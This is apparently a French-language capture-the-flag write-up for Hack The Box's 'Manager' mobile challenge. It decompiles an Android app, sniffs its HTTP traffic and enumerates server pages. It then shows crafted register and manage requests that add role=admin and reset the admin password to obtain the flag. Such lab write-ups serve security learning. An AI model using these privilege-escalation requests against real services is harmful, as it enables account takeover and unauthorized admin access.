# Manager [Mobile] Challenge

[https://app.hackthebox.com/challenges/retired](https://app.hackthebox.com/challenges/retired)

1. Nous avons besoin d’installer jadx-gui `apt install jadx`

 2.   Android Studio

1. Wireshark

Nous pouvons aller dans jadx-gui puis com → example.manager Nous pouvons maintenant lire le code de l’application On peux déjà imaginer avec le nom des class différentes fonctionnalités de l’application. Par exemple Register et login parle d’eux même.

Maintenant lançon l’application dans l’émulateur Android et analysons le trafic, tout en lançant 

des requêtes de log-in avec l’application au serveur.

On peut afficher la requête HTTP Stream :

```python
POST /login.php HTTP/1.1
User-Agent: Mozilla/5.0
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Host: 159.65.56.112:32217
Connection: Keep-Alive
Accept-Encoding: gzip
Content-Length: 27

username=test&password=testHTTP/1.1 200 OK
Date: Wed, 06 Apr 2022 19:05:25 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 15
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

User not found!
```

Sur l’application mobile nous pouvons :

1. Nous connecter à un serveur en donnant l’ip et le port
2. Nous connecter à un user
3. Créé un utilisateur sans pouvoir choisir l’id et le rôle

Le plus intéressant est d’essayer de modifier la dernière option pour pouvoir choisir un autre id comme celui de l’admin et/ou le rôle de l’utilisateur.

Commençons par regarder la requête avec WireShark :

```python
POST /manage.php HTTP/1.1
User-Agent: Mozilla/5.0
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Host: 159.65.56.112:32217
Connection: Keep-Alive
Accept-Encoding: gzip
Content-Length: 28

username=test&password=test3HTTP/1.1 200 OK
Date: Wed, 06 Apr 2022 20:00:58 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 30
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Password updated successfully.
```

Nous allons maintenant regarder tous les répertoires du serveur nous pouvons utiliser ffuf ou gobuster pour analyser le site

`gobusterz [http://161.35.47.235:30184](http://161.35.47.235:30184)-x php`

On trouve 4 pages :

```bash
/login.php

/register.php

/config.php

/manage.php
```

On utilise burp et on lance le repeater la requete sur un site

sur la page register 

On met Content-Type: application/x-www-form-urlencoded comme on le vois dans les packet wireshark, dans notre envoie burp.

On ajoute

username=admin&password=admin&role=admin

POST sur la page mange avec burp en enlevant le role admin et en mettant le nom admin et mot de passe que l’on veux.

POST login sur le nom admin et le mot de passe que nous avons mis

On retrouve le flag sur la réponse du login admin.